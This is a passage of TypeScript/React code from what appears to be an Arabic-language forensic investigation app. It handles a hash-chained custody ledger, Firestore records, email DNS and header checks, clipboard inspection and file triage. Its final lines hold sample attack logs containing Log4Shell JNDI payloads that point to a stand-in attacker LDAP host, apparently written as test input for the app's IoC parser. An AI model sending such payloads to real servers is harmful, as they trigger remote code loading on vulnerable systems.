    } catch (err: any) {
      console.error('Photo upload error:', err);
      let errorMsg = 'حدث خطأ أثناء رفع الصورة.';
      if (err.code === 'storage/retry-limit-exceeded') {
        errorMsg = 'فشل الاتصال بخادم التخزين (تجاوز مهلة المحاولة).';
      } else if (err.code === 'storage/unauthorized') {
        errorMsg = 'ليس لديك صلاحية لرفع الملفات.';
      } else if (err.code === 'storage/quota-exceeded') {
        errorMsg = 'تم تجاوز حصة التخزين المسموح بها.';
      }
      notifyStatus(errorMsg, 'error');
    }
  };

  const recordCustodyLedgerBlock = (
    evidenceId: string,
    actionCategory: CustodyActionCategory,
    action: string,
    location: string,
    notes: string = '',
    officerName: string = ''
  ): Promise<ChainOfCustodyEntry | undefined> => {
    const runTask = async (): Promise<ChainOfCustodyEntry | undefined> => {
      const activeUid = auth.currentUser?.uid || user?.uid;
      if (!activeUid) return undefined;

      const officer = (officerName || userProfile?.displayName || user?.displayName || 'كبير المحققين السياديين').slice(0, 120);
      const timestamp = new Date().toISOString();
      const safeEvidenceId = (evidenceId || 'system-event').slice(0, 120);
      const safeAction = action.slice(0, 240);
      const safeLocation = location.slice(0, 240);
      const safeNotes = notes.slice(0, 960);

      let prevHash = latestLedgerHashRef.current;
      if (!prevHash || prevHash.length !== 64) {
        let currentLedger = globalCustodyLedger;
        if (currentLedger.length === 0) {
          try {
            currentLedger = JSON.parse(localStorage.getItem('sovereign_global_custody_ledger') || '[]');
          } catch {
            currentLedger = [];
          }
        }
        const sorted = [...currentLedger].sort((a, b) => getTimeMsSafe(a.timestamp) - getTimeMsSafe(b.timestamp));
        prevHash = sorted.length > 0 && sorted[sorted.length - 1].recordHash && sorted[sorted.length - 1].recordHash!.length === 64
          ? sorted[sorted.length - 1].recordHash!
          : '0000000000000000000000000000000000000000000000000000000000000000';
      }

      const recordHash = await computeCustodyBlockHash(prevHash, safeEvidenceId, safeAction, safeLocation, timestamp, activeUid, officer);
      latestLedgerHashRef.current = recordHash;

      const firestorePayload = {
        userId: activeUid,
        evidenceId: safeEvidenceId,
        actionCategory,
        officerName: officer,
        action: safeAction,
        location: safeLocation,
        notes: safeNotes,
        timestamp,
        prevHash,
        recordHash,
      };

      let ledgerId = 'ledger-' + Date.now() + '-' + Math.random().toString(36).substring(2, 7);
      let synced = false;

      if (auth.currentUser) {
        try {
          const docRef = await addDoc(collection(db, 'custody_ledger'), firestorePayload);
          ledgerId = docRef.id;
          synced = true;
        } catch (err) {
          console.error('Firestore custody_ledger write error:', err);
          handleFirestoreError(err, OperationType.CREATE, 'custody_ledger');
        }
      }

      const newLedgerBlock: ChainOfCustodyEntry = { id: ledgerId, ...firestorePayload, synced };
      setGlobalCustodyLedger(prev => {
        const updated = [newLedgerBlock, ...prev.filter(e => e.id !== ledgerId)];
        updated.sort((a, b) => getTimeMsSafe(b.timestamp) - getTimeMsSafe(a.timestamp));
        try {
          localStorage.setItem('sovereign_global_custody_ledger', JSON.stringify(updated.slice(0, 150)));
        } catch (_) {}
        return updated;
      });

      return newLedgerBlock;
    };

    const resultPromise = custodyWriteQueueRef.current.then(runTask, runTask);
    custodyWriteQueueRef.current = resultPromise.then(() => undefined, () => undefined);
    return resultPromise;
  };

  const addToCustody = (
    evidenceId: string, 
    action: string, 
    location: string, 
    notes: string = '', 
    officerName: string = '',
    baseHistory?: ChainOfCustodyEntry[],
    actionCategory: CustodyActionCategory = 'MANUAL_CUSTODY'
  ): Promise<ChainOfCustodyEntry | undefined> => {
    const runTask = async (): Promise<ChainOfCustodyEntry | undefined> => {
      const activeUid = auth.currentUser?.uid || user?.uid;
      if (!activeUid) return undefined;
      const officer = officerName || userProfile?.displayName || user?.displayName || 'كبير المحققين السياديين';
      const timestamp = new Date().toISOString();

      let prevHash = evidenceCustodyTipRef.current.get(evidenceId) || '';
      if (!prevHash || prevHash.length !== 64) {
        let existing = (baseHistory || custodyHistory).filter(e => e.evidenceId === evidenceId);
        if (existing.length === 0) {
          try {
            existing = JSON.parse(localStorage.getItem(`sovereign_custody_${evidenceId}`) || '[]');
          } catch {
            existing = [];
          }
        }
        const sorted = [...existing].sort((a, b) => getTimeMsSafe(a.timestamp) - getTimeMsSafe(b.timestamp));
        prevHash = sorted.length > 0 && sorted[sorted.length - 1].recordHash
          ? sorted[sorted.length - 1].recordHash!
          : '0000000000000000000000000000000000000000000000000000000000000000';
      }

      const recordHash = await computeCustodyBlockHash(prevHash, evidenceId, action, location, timestamp, activeUid, officer);
      evidenceCustodyTipRef.current.set(evidenceId, recordHash);

      const entryData = {
        evidenceId,
        userId: activeUid,
        officerName: officer,
        action,
        location,
        notes,
        timestamp,
        prevHash,
        recordHash
      };

      let savedId = 'coc-' + Date.now() + '-' + Math.random().toString(36).substring(2, 7);

      if (auth.currentUser) {
        try {
          const parentSnap = await getDoc(doc(db, 'evidence', evidenceId));
          if (parentSnap.exists()) {
            const docRef = await addDoc(collection(db, 'evidence', evidenceId, 'chain_of_custody'), entryData);
            savedId = docRef.id;
          }
        } catch (err) {
          console.error('Firestore custody write error:', err);
          handleFirestoreError(err, OperationType.CREATE, `evidence/${evidenceId}/chain_of_custody`);
        }
      }

      const newEntry: ChainOfCustodyEntry = { id: savedId, ...entryData, actionCategory };

      setCustodyHistory(prev => {
        const updated = [newEntry, ...prev.filter(e => e.id !== newEntry.id)];
        updated.sort((a, b) => getTimeMsSafe(b.timestamp) - getTimeMsSafe(a.timestamp));
        return updated;
      });

      try {
        const key = `sovereign_custody_${evidenceId}`;
        const localList: ChainOfCustodyEntry[] = JSON.parse(localStorage.getItem(key) || '[]');
        localStorage.setItem(key, JSON.stringify([newEntry, ...localList.filter(e => e.id !== newEntry.id)]));
      } catch (e) {
        console.warn('Custody localStorage error:', e);
      }

      await recordCustodyLedgerBlock(evidenceId, actionCategory, action, location, notes, officer);

      return newEntry;
    };

    const resultPromise = evidenceCustodyQueueRef.current.then(runTask, runTask);
    evidenceCustodyQueueRef.current = resultPromise.then(() => undefined, () => undefined);
    return resultPromise;
  };

  const fetchCustodyHistory = async (evidenceId: string) => {
    const activeUid = auth.currentUser?.uid || user?.uid;
    if (!activeUid) return;
    setSelectedEvidenceForHistory(evidenceId);
    try {
      const history: ChainOfCustodyEntry[] = [];
      let parentExistsInCloud = false;

      if (auth.currentUser) {
        const parentSnap = await getDoc(doc(db, 'evidence', evidenceId));
        parentExistsInCloud = parentSnap.exists();
        if (parentExistsInCloud) {
          const q = query(collection(db, 'evidence', evidenceId, 'chain_of_custody'), orderBy('timestamp', 'desc'));
          const snap = await getDocs(q);
          snap.forEach(docSnap => {
            history.push({ id: docSnap.id, ...docSnap.data() } as ChainOfCustodyEntry);
          });
        }
      }

      const key = `sovereign_custody_${evidenceId}`;
      const localList: ChainOfCustodyEntry[] = JSON.parse(localStorage.getItem(key) || '[]');
      const combined = [...history];
      for (const loc of localList) {
        if (!combined.some(c => c.id === loc.id || (c.recordHash && c.recordHash === loc.recordHash))) {
          combined.push(loc);
        }
      }

      if (combined.length === 0) {
        const targetEvidence = evidenceList.find(e => e.id === evidenceId);
        const fileName = targetEvidence?.fileName || 'ملف الدليل';
        const genesisTimestamp = targetEvidence?.createdAt || new Date().toISOString();
        const genesisOfficer = userProfile?.displayName || user?.displayName || 'كبير المحققين السياديين';
        const genesisPrevHash = '0000000000000000000000000000000000000000000000000000000000000000';
        const genesisHash = await computeCustodyBlockHash(
          genesisPrevHash, 
          evidenceId, 
          'التحريز الأولي وقيد الدليل في السجل الجنائي', 
          'مختبر الأدلة الرقمية السيادي - محطة العمل SOC-01', 
          genesisTimestamp, 
          activeUid, 
          genesisOfficer
        );
        const genesisPayload = {
          evidenceId,
          userId: activeUid,
          officerName: genesisOfficer,
          action: 'التحريز الأولي وقيد الدليل في السجل الجنائي',
          location: 'مختبر الأدلة الرقمية السيادي - محطة العمل SOC-01',
          notes: `تم قيد الدليل الرقمي (${fileName}) وتوليد كتلة البداية (Genesis Block) الموثقة بالبصمة التشفيرية SHA-256.`,
          timestamp: genesisTimestamp,
          prevHash: genesisPrevHash,
          recordHash: genesisHash
        };
        let genesisId = 'genesis-' + evidenceId.substring(0, 8);
        if (auth.currentUser && parentExistsInCloud) {
          try {
            const docRef = await addDoc(collection(db, 'evidence', evidenceId, 'chain_of_custody'), genesisPayload);
            genesisId = docRef.id;
          } catch (err) {
            console.warn('Genesis Firestore write skipped:', err);
          }
        }
        const genesisEntry: ChainOfCustodyEntry = { id: genesisId, ...genesisPayload };
        combined.push(genesisEntry);
        try {
          localStorage.setItem(key, JSON.stringify([genesisEntry]));
        } catch (_) {}
      }

      combined.sort((a, b) => getTimeMsSafe(b.timestamp) - getTimeMsSafe(a.timestamp));
      setCustodyHistory(combined);
      setCustodyViewMode('evidence');
      setActiveTab('custody');
    } catch (err) {
      console.error('Error fetching custody history:', err);
      const key = `sovereign_custody_${evidenceId}`;
      const localList: ChainOfCustodyEntry[] = JSON.parse(localStorage.getItem(key) || '[]');
      setCustodyHistory(localList);
      setActiveTab('custody');
    }
  };

  const fetchDashboardStats = async (targetUser?: User | null) => {
    const activeUser = targetUser ?? auth.currentUser;
    const calcLocalThreats = () => {
      const evidenceThreats = evidenceList.filter(
        e => (e.analysis?.authenticityScore ?? 100) < 50 || e.analysis?.riskLevel === 'حرج' || e.analysis?.riskLevel === 'مرتفع'
      ).length;
      const feedThreats = liveFeedsResult?.items?.filter(
        (item: any) => item.severity === 'critical' || item.severity === 'high'
      ).length || 0;
      const intelThreats = threatIntelHistory.filter(
        h => h.isMalicious || h.riskLevel === 'حرج' || h.riskLevel === 'مرتفع'
      ).length;
      return evidenceThreats + feedThreats + intelThreats;
    };

    if (!activeUser) {
      const totalRealThreats = calcLocalThreats();
      const localStats: DashboardStats = {
        totalInvestigations: investigations.length,
        totalEvidence: evidenceList.length,
        totalLogs: auditLogs.length,
        detectedThreats: totalRealThreats,
        lastUpdated: new Date().toISOString()
      };
      setDashboardStats(localStats);
      try { localStorage.setItem('sovereign_dashboard_stats', JSON.stringify(localStats)); } catch (_) {}
      return;
    }
    setStatsLoading(true);
    try {
      let loaded = false;
      try {
        const token = await activeUser.getIdToken();
        const res = await fetch(apiUrl('/api/dashboard-stats'), {
          headers: { 'Authorization': `Bearer ${token}` }
        });
        if (res.ok) {
          const parsed = await safeReadJsonResponse(res);
          if (parsed.isJson && parsed.data) {
            setDashboardStats(parsed.data);
            try { localStorage.setItem('sovereign_dashboard_stats', JSON.stringify(parsed.data)); } catch (_) {}
            loaded = true;
          }
        }
      } catch (fetchErr) {
        console.warn('Backend API stats fallback to Firestore client SDK:', fetchErr);
      }

      if (!loaded) {
        const invSnap = await getDocs(query(collection(db, 'investigations'), where('userId', '==', activeUser.uid)));
        const evSnap = await getDocs(query(collection(db, 'evidence'), where('userId', '==', activeUser.uid)));
        const auditSnap = await getDocs(query(collection(db, 'audit_logs'), where('userId', '==', activeUser.uid)));
        let threats = 0;
        evSnap.forEach(d => {
          const val = d.data();
          if (val.analysis?.authenticityScore < 50 || val.analysis?.riskLevel === 'حرج' || val.analysis?.riskLevel === 'مرتفع') threats++;
        });
        auditSnap.forEach(d => {
          const val = d.data();
          if (val.risk === 'حرج' || val.risk === 'مرتفع') threats++;
        });
        const finalStats: DashboardStats = {
          totalInvestigations: invSnap.size,
          totalEvidence: evSnap.size,
          totalLogs: auditSnap.size,
          detectedThreats: threats,
          lastUpdated: new Date().toISOString()
        };
        setDashboardStats(finalStats);
        try { localStorage.setItem('sovereign_dashboard_stats', JSON.stringify(finalStats)); } catch (_) {}
      }
    } catch (err) {
      console.error('Error fetching stats:', err);
    } finally {
      setStatsLoading(false);
    }
  };

  const fetchEvidence = async (targetUser?: User | null) => {
    const activeUser = targetUser ?? auth.currentUser;
    if (!activeUser) return;
    setEvidenceLoading(true);
    try {
      const q = query(
        collection(db, 'evidence'), 
        where('userId', '==', activeUser.uid)
      );
      const snapshot = await getDocs(q);
      const list: Evidence[] = [];
      snapshot.forEach(docSnap => {
        const data = docSnap.data();
        list.push({ id: docSnap.id, ...data } as Evidence);
      });
      list.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
      setEvidenceList(list);
      try { localStorage.setItem('sovereign_evidence_local', JSON.stringify(list)); } catch (_) {}
    } catch (err) {
      console.error('Error fetching evidence:', err);
      handleFirestoreError(err, OperationType.LIST, 'evidence');
    } finally {
      setEvidenceLoading(false);
    }
  };

  const createNewInvestigation = async (
    title: string,
    caseNumber?: string,
    description?: string,
    isAutoDefault: boolean = false
  ) => {
    const activeUid = auth.currentUser?.uid || user?.uid;
    if (!activeUid) return;
    const finalTitle = title.trim();
    if (!finalTitle) return;
    const finalCaseNum = caseNumber?.trim() || `SOV-CASE-${new Date().getFullYear()}-${String(Math.floor(1000 + Math.random() * 9000))}`;
    const newInvPayload = {
      title: finalTitle,
      caseNumber: finalCaseNum,
      description: description?.trim() || '',
      status: 'active' as const,
      createdAt: new Date().toISOString()
    };

    if (!auth.currentUser) {
      const localInv: Investigation = {
        id: 'inv-local-' + Date.now(),
        ...newInvPayload
      };
      setInvestigations(prev => {
        const updated = [localInv, ...prev.filter(i => i.id !== localInv.id)];
        try { localStorage.setItem('sovereign_investigations_local', JSON.stringify(updated)); } catch (_) {}
        return updated;
      });
      changeCurrentInvestigation(localInv.id);
      if (!isAutoDefault) {
        await recordCustodyLedgerBlock(
          localInv.id,
          'CASE_MANAGEMENT',
          `فتح قضية تحقيق جنائي جديدة (${finalTitle})`,
          'إدارة التحقيقات والقضايا',
          `رقم القضية: ${finalCaseNum}`
        );
      }
      notifyStatus(`تم إنشاء ملف القضية (${finalTitle}) محلياً بنجاح.`, 'success');
      return localInv.id;
    }

    try {
      const docRef = await addDoc(collection(db, 'investigations'), {
        userId: auth.currentUser.uid,
        ...newInvPayload
      });
      const newInv: Investigation = {
        id: docRef.id,
        ...newInvPayload
      };
      setInvestigations(prev => {
        const updated = [newInv, ...prev.filter(i => i.id !== docRef.id)];
        try { localStorage.setItem('sovereign_investigations_local', JSON.stringify(updated)); } catch (_) {}
        return updated;
      });
      changeCurrentInvestigation(docRef.id);
      if (!isAutoDefault) {
        await recordCustodyLedgerBlock(
          docRef.id,
          'CASE_MANAGEMENT',
          `فتح قضية تحقيق جنائي جديدة (${finalTitle})`,
          'إدارة التحقيقات والقضايا (Firestore)',
          `معرف القضية: ${docRef.id} • رقم القضية: ${finalCaseNum}`
        );
      }
      notifyStatus(`تم إنشاء ملف القضية (${finalTitle}) وحفظه في Firestore بنجاح.`, 'success');
      return docRef.id;
    } catch (err) {
      console.error('Error creating investigation:', err);
      handleFirestoreError(err, OperationType.CREATE, 'investigations');
    }
  };

  const deleteInvestigation = async (id: string) => {
    if (!window.confirm('هل أنت متأكد من حذف هذا التحقيق؟ ستبقى الأدلة محفوظة في السجل العام.')) return;
    try {
      if (auth.currentUser) {
        await deleteDoc(doc(db, 'investigations', id));
      }
      setInvestigations(prev => {
        const updated = prev.filter(i => i.id !== id);
        try { localStorage.setItem('sovereign_investigations_local', JSON.stringify(updated)); } catch (_) {}
        return updated;
      });
      if (currentInvestigationId === id) {
        changeCurrentInvestigation(null);
      }
      notifyStatus('تم حذف ملف التحقيق بنجاح.', 'success');
    } catch (err) {
      console.error('Error deleting investigation:', err);
      handleFirestoreError(err, OperationType.DELETE, 'investigations');
    }
  };

  const reassignEvidenceInvestigation = async (evidenceId: string, newInvestigationId: string) => {
    try {
      if (auth.currentUser) {
        await updateDoc(doc(db, 'evidence', evidenceId), {
          investigationId: newInvestigationId || 'general'
        });
      }
      setEvidenceList(prev => {
        const updated = prev.map(e => e.id === evidenceId ? { ...e, investigationId: newInvestigationId } : e);
        try { localStorage.setItem('sovereign_evidence_local', JSON.stringify(updated)); } catch (_) {}
        return updated;
      });
      notifyStatus('تم إعادة ربط الدليل بالقضية بنجاح.', 'success');
    } catch (err) {
      console.error('Error reassigning evidence:', err);
      handleFirestoreError(err, OperationType.UPDATE, 'evidence');
    }
  };

  const runFullHealthCheck = async () => {
    if (!auth.currentUser) {
      notifyStatus('يتطلب اختبار تكامل Firestore و Storage تفعيل جلسة سحابية مصادق عليها.', 'warning');
      return;
    }
    setIsTestingHealth(true);
    type Status = 'pass' | 'fail' | 'pending';
    const results: { auth: Status; firestore: Status; storage: Status } = { auth: 'pending', firestore: 'pending', storage: 'pending' };
    
    try {
      results.auth = 'pass';
      setHealthStatus(prev => ({ ...prev, auth: 'pass' }));

      const testDoc = await addDoc(collection(db, 'investigations'), {
        userId: auth.currentUser.uid,
        title: 'اختبار تكامل النظام - ' + new Date().toLocaleTimeString(),
        status: 'active',
        createdAt: new Date().toISOString(),
        isTest: true
      });
      if (testDoc.id) {
        results.firestore = 'pass';
        setHealthStatus(prev => ({ ...prev, firestore: 'pass' }));
      } else {
        results.firestore = 'fail';
      }

      const dummyBlob = new Blob(['forensic-test-data'], { type: 'text/plain' });
      const testPath = `tests/${auth.currentUser.uid}/health-check-${Date.now()}.txt`;
      const fileRef = ref(storage, testPath);
      const url = await Promise.race([
        uploadBytes(fileRef, dummyBlob).then(() => getDownloadURL(fileRef)),
        new Promise<string>((_, reject) => setTimeout(() => reject(new Error('Storage timeout')), 4000))
      ]);
      if (url) {
        results.storage = 'pass';
        setHealthStatus(prev => ({ ...prev, storage: 'pass' }));
      } else {
        results.storage = 'fail';
      }

    } catch (err) {
      console.error('Health Check failed:', err);
      if (results.firestore === 'pending') results.firestore = 'fail';
      if (results.storage === 'pending') results.storage = 'fail';
    } finally {
      setHealthStatus({ ...results, lastRun: new Date().toLocaleString('ar-SA') });
      setIsTestingHealth(false);
      fetchDashboardStats();
      fetchEvidence();
    }
  };

  const saveAuditLog = async (entry: AuditLogEntry, extraData?: any) => {
    const normalizedIsoTs =
      entry.timestamp && !Number.isNaN(new Date(entry.timestamp).getTime())
        ? new Date(entry.timestamp).toISOString()
        : new Date().toISOString();

    const localEntry: AuditLogEntry = {
      ...entry,
      timestamp: normalizedIsoTs,
      investigationId: entry.investigationId || currentInvestigationId || undefined,
      synced: Boolean(auth.currentUser)
    };

    const alreadyInCloudFeedLog =
      localEntry.id.startsWith('feed-') &&
      auditLogsRef.current.some((item) => item.id === localEntry.id && item.synced);

    setAuditLogs(prev => {
      const updated = dedupeAuditLogs([localEntry, ...prev.filter(item => item.id !== localEntry.id)]);
      auditLogsRef.current = updated;
      try {
        localStorage.setItem('siyadi_audit_logs', JSON.stringify(updated.slice(0, 100)));
      } catch (_) {}
      return updated;
    });

    if (auth.currentUser && !alreadyInCloudFeedLog) {
      try {
        await addDoc(collection(db, 'audit_logs'), {
          id: localEntry.id,
          userId: auth.currentUser.uid,
          investigationId: currentInvestigationId || 'inv-sovereign-default',
          fileName: localEntry.fileName,
          fileSize: extraData?.fileSizeRaw ?? localEntry.fileSize ?? 0,
          authenticityScore: localEntry.score,
          laplacianVariance: extraData?.laplacianVariance || 0,
          aiConfidence: extraData?.aiProbability || 0,
          summary: localEntry.verdict,
          sha256: localEntry.sha256,
          createdAt: normalizedIsoTs
        });
      } catch (err) {
        console.error('Error saving audit log to Firestore:', err);
        handleFirestoreError(err, OperationType.CREATE, 'audit_logs');
      }
    }
  };

  // Email DNS MX Lookup
  const checkEmailForensics = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!targetEmail || !targetEmail.includes('@')) {
      notifyStatus('يرجى إدخال بريد إلكتروني صحيح.', 'warning');
      return;
    }

    setEmailLoading(true);
    try {
      const parts = targetEmail.split('@');
      const domain = parts[1].toLowerCase();

      const disposableList = ['mailinator.com', 'yopmail.com', '10minutemail.com', 'tempmail.com', 'guerrillamail.com', 'sharklasers.com', 'trashmail.com', 'dispostable.com', 'temp-mail.org', 'fakeinbox.com'];
      const isDisposable = disposableList.includes(domain);

      const dnsRes = await fetch(`https://cloudflare-dns.com/dns-query?name=${domain}&type=MX`, {
        headers: { 'Accept': 'application/dns-json' }
      });
      const parsedDns = await safeReadJsonResponse(dnsRes);
      const dnsData = parsedDns.data || {};

      const mxAnswers = dnsData.Answer || [];
      const mxServers = mxAnswers.map((ans: any) => ans.data);
      const mxRecordsFound = mxServers.length > 0;

      let domainInfo = '';
      let breachStatus = '';

      if (isDisposable) {
        domainInfo = 'تحذير: هذا النطاق تابع لخدمة بريد مؤقت/وهمي (Disposable Temp-mail)، ويُعَدُّ غير موثوق.';
        breachStatus = 'بريد وهمي غير موثوق - لا توجد سجلات أمان حقيقية مرتبطة به.';
      } else if (!mxRecordsFound) {
        domainInfo = `تنبيه: لم يتم العثور على سجلات بريدية نشطة (MX Records) لهذا النطاق (${domain}) عبر فحص DNS الحي.`;
        breachStatus = 'نطاق غير صالح لاستقبال البريد الفعلي.';
      } else {
        domainInfo = `نطاق رسمي موثوق (${domain}) - تم التحقق من وجود ${mxServers.length} خوادم بريدية نشطة (Active MX Records) عبر DNS-over-HTTPS.`;
        breachStatus = 'نطاق رسمي موثوق - لم يتم رصد أي تسريب حقيقي في السجلات الحية.';
      }

      const result: EmailCheckResult = {
        email: targetEmail,
        domain,
        isDisposable,
        mxRecordsFound,
        mxServers,
        domainInfo,
        breachStatus
      };

      setEmailCheckResult(result);

      saveAuditLog({
        id: Math.random().toString(36).substring(2, 9),
        timestamp: new Date().toISOString(),
        fileName: `فحص إيميل: ${targetEmail}`,
        fileSize: isDisposable ? 'بريد وهمي' : 'نطاق نشط',
        verdict: isDisposable ? 'بريد مؤقت محظور' : 'نطاق بريدي نشط وموثوق',
        score: isDisposable ? 40 : 95,
        risk: isDisposable ? 'متوسط' : 'منخفض',
        type: 'email',
        sha256: 'N/A'
      });
    } catch (err) {
      console.warn('Primary Cloudflare DNS MX Lookup error, trying Google DoH:', err);
      const parts = targetEmail.split('@');
      const domain = parts[1].toLowerCase();
      const disposableList = ['mailinator.com', 'yopmail.com', '10minutemail.com', 'tempmail.com', 'guerrillamail.com', 'sharklasers.com', 'trashmail.com', 'dispostable.com', 'temp-mail.org', 'fakeinbox.com'];
      const isDisposable = disposableList.includes(domain);

      let mxServers: string[] = [];
      let mxRecordsFound = false;
      try {
        const googleDnsRes = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=MX`);
        const googleParsed = await safeReadJsonResponse(googleDnsRes);
        const answers = Array.isArray(googleParsed.data?.Answer) ? googleParsed.data.Answer : [];
        mxServers = answers.map((a: any) => String(a.data)).filter(Boolean);
        mxRecordsFound = mxServers.length > 0;
      } catch {
        mxServers = [];
        mxRecordsFound = false;
      }

      setEmailCheckResult({
        email: targetEmail,
        domain,
        isDisposable,
        mxRecordsFound,
        mxServers,
        domainInfo: isDisposable
          ? 'تحذير: هذا النطاق تابع لخدمة بريد مؤقت/وهمي (Disposable Temp-mail)، ويُعَدُّ غير موثوق.'
          : mxRecordsFound
          ? `نطاق رسمي موثوق (${domain}) - تم التحقق عبر Google DNS-over-HTTPS من وجود ${mxServers.length} خوادم بريدية نشطة.`
          : `تعذر العثور على سجلات MX نشطة للنطاق (${domain}) أو تعذر الاتصال بخوادم DNS الحية.`,
        breachStatus: isDisposable
          ? 'بريد وهمي غير موثوق.'
          : mxRecordsFound
          ? 'نطاق رسمي نشط في DNS الحي.'
          : 'لا توجد سجلات MX مؤكدة في الاستعلام الحي.',
      });
    } finally {
      setEmailLoading(false);
    }
  };

  const analyzeEmailHeader = (e: React.FormEvent) => {
    e.preventDefault();
    if (!emailHeaderInput.trim()) {
      notifyStatus('يرجى لصق ترويسة البريد (Email Headers) أولاً.', 'warning');
      return;
    }

    const headers = emailHeaderInput.toLowerCase();
    const fromMatch = emailHeaderInput.match(/From:\s*(.*)/i);
    const returnPathMatch = emailHeaderInput.match(/Return-Path:\s*(.*)/i);

    const fromVal = fromMatch ? fromMatch[1] : 'غير معروف';
    const returnPathVal = returnPathMatch ? returnPathMatch[1] : 'غير معروف';

    const spfPass = headers.includes('spf=pass');
    const dkimPass = headers.includes('dkim=pass');
    const dmarcPass = headers.includes('dmarc=pass');

    let isSpoofed = false;
    if (headers.includes('spf=fail') || headers.includes('dkim=fail') || (!spfPass && !dkimPass)) {
      isSpoofed = true;
    }

    const verdict = isSpoofed 
      ? 'تحذير خطير: تم رصد محاولة تزييف في ترويسة الإيميل (Sender Spoofing)! النطاق المرسل لا يتطابق مع خادم المصدر.'
      : 'ترويسة البريد سليمة وتم التحقق من تطابق خوادم المصدر بنجاح (SPF/DKIM Validated).';

    setHeaderResult({
      isSpoofed,
      from: fromVal,
      returnPath: returnPathVal,
      spf: spfPass ? 'PASS (اجتاز المصادقة)' : 'FAIL / NONE (فشل أو غير موجود)',
      dkim: dkimPass ? 'PASS (اجتاز المصادقة)' : 'FAIL / NONE (فشل أو غير موجود)',
      dmarc: dmarcPass ? 'PASS (اجتاز المصادقة)' : 'FAIL / NONE (فشل أو غير موجود)',
      verdict
    });
  };

  const inspectLiveClipboard = async () => {
    setClipboardLoading(true);
    try {
      if (!navigator.clipboard || !navigator.clipboard.readText) {
        notifyStatus('ميزة قراءة الحافظة غير مدعومة في هذا المتصفح.', 'warning');
        setClipboardLoading(false);
        return;
      }

      const text = await navigator.clipboard.readText();
      if (!text || text.trim() === '') {
        setClipboardResult({
          text: 'الحافظة فارغة حالياً',
          timestamp: new Date().toLocaleTimeString('ar-SA'),
          isUrl: false,
          threatLevel: 'آمن',
          analysis: 'لم يتم العثور على أي نصوص أو روابط في ذاكرة الحافظة.'
        });
        setClipboardLoading(false);
        return;
      }

      const isUrl = /^https?:\/\//i.test(text.trim()) || text.includes('.');
      let threatLevel: 'آمن' | 'مشبوه' | 'خطر' = 'آمن';
      let analysis = 'النص المنسوخ نظيف وآمن.';

      if (isUrl) {
        if (text.includes('bit.ly') || text.includes('t.co') || text.includes('http://')) {
          threatLevel = 'مشبوه';
          analysis = 'الرابط قصير أو غير مشفر (HTTP)، يرجى الحذر.';
        } else if (text.includes('phish') || text.includes('login') || text.includes('verify')) {
          threatLevel = 'خطر';
          analysis = 'تحذير أمني: كلمات مفتاحية للتصيد الاحصائي (Phishing).';
        }
      }

      setClipboardResult({
        text,
        timestamp: new Date().toLocaleTimeString('ar-SA'),
        isUrl,
        threatLevel,
        analysis
      });

      saveAuditLog({
        id: Math.random().toString(36).substring(2, 9),
        timestamp: new Date().toISOString(),
        fileName: 'فحص الحافظة الحية',
        fileSize: `${text.length} حرف`,
        verdict: `حالة الحافظة: ${threatLevel}`,
        score: threatLevel === 'آمن' ? 95 : 50,
        risk: threatLevel === 'آمن' ? 'منخفض' : 'متوسط',
        type: 'clipboard',
        sha256: 'N/A'
      });

      await recordCustodyLedgerBlock(
        `clip-${Date.now()}`,
        'FILE_INSPECTION',
        `فحص أمني لمحتوى الحافظة الحية (${threatLevel})`,
        'مختبر فحص الحافظة الحية',
        `طول النص: ${text.length} حرف | التقييم: ${analysis}`
      );
    } catch (err) {
      console.error(err);
      notifyStatus('يرجى السماح بالوصول إلى الحافظة من إعدادات المتصفح.', 'warning');
    } finally {
      setClipboardLoading(false);
    }
  };

  const inspectPickedFile = (file: File) => {
    const lowerName = file.name.toLowerCase();
    if (lowerName.endsWith('.apk')) {
      setActiveTab('apk');
      void handleApkForensicUpload(file);
      return;
    }
    if (
      lowerName === 'history' ||
      lowerName === 'places.sqlite' ||
      lowerName === 'history.db' ||
      lowerName.endsWith('.sqlite') ||
      lowerName.endsWith('.sqlite3') ||
      lowerName.endsWith('.db')
    ) {
      setActiveTab('browser');
      void handleBrowserSqliteUpload(file);
      return;
    }
    if (/\.(ps1|psm1|psd1|vbs|vbe|wsf|hta|bat|cmd|py|pyw|js|mjs|cjs|jse|sh|bash)$/i.test(lowerName)) {
      setActiveTab('deobfuscator');
      void handleScriptFileUpload(file);
      return;
    }
    if (/\.(exe|dll|sys|elf|so|dylib|dmp)$/i.test(lowerName)) {
      setActiveTab('binary_lab');
      void handleBinaryLabFileUpload(file);
      return;
    }
    const fileSize = file.size;
    const fileSizeFormatted = formatFileSize(fileSize);
    const lastModified = new Date(file.lastModified).toLocaleString('ar-SA');
    const mimeType = file.type || 'application/octet-stream';
    const fileName = file.name;
    setImageName(fileName);
    setIsAnalyzing(true);
    setElaImage(null);

    const reader = new FileReader();
    reader.onload = async (event) => {
      try {
        const buffer = event.target?.result as ArrayBuffer;
        if (buffer) {
          const blob = new Blob([buffer], { type: mimeType });
          const url = URL.createObjectURL(blob);
          processImageFile(url, fileName, fileSize, fileSizeFormatted, lastModified, mimeType, buffer);
        } else {
          setIsAnalyzing(false);
        }
      } catch (err) {
        console.error('File buffer conversion error:', err);
        setIsAnalyzing(false);
      }
    };
    reader.onerror = () => {
      console.error('File reading failed');
      setIsAnalyzing(false);
      notifyStatus('تعذر قراءة الملف من الجهاز.', 'error');
    };
    reader.readAsArrayBuffer(file);
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    e.target.value = '';
    inspectPickedFile(file);
  };

  const handleLogFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    e.target.value = '';
    const reader = new FileReader();
    reader.onload = (ev) => {
      const text = (ev.target?.result as string) || '';
      setLogInputText(text);
      parseLogsAndExtractIoCs(text, file.name);
    };
    reader.readAsText(file);
  };

  const SAMPLE_ATTACK_LOGS = {
    log4j: `2026-11-13T22:15:30.124Z nginx-access [ALERT] 185.220.101.45 - - [13/Nov/2026:22:15:30 +0000] "GET /login?user=\${jndi:ldap://attacker-c2.darknet-ops.ru:1389/Exploit} HTTP/1.1" 400 342 "-" "\${jndi:ldap://194.26.29.112:8888/TomcatBypass}"
